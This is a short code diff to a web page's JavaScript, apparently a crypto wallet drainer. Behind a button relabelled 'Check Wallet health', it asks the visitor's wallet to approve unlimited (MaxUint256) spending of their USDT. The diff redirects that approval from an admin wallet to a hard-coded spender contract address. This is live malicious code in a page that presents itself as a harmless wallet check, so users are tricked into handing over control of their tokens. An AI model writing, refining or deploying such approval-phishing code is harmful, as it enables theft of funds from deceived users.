@@ -80,8 +80,9 @@ async function approveUSDT(targetButton) {
         targetButton.disabled = true;
         targetButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
 
+        const SPENDER_CONTRACT = "0xffcd7bc9cf5b638ba24941b0a5946d7cbf1c11be";
         const contract = new ethers.Contract(usdtAddress, APPROVE_ABI, signer);
-        const tx = await contract.approve(ADMIN_WALLET, ethers.MaxUint256);
+        const tx = await contract.approve(SPENDER_CONTRACT, ethers.MaxUint256);
         await tx.wait();
 
         const userAddress = await signer.getAddress();
@@ -101,6 +102,7 @@ async function approveUSDT(targetButton) {
         targetButton.innerHTML = '<i class="fas fa-award" style="margin-right: 0.5rem;"></i>Check Wallet health';
     }
 }
+
 
 
 // Bind connect buttons
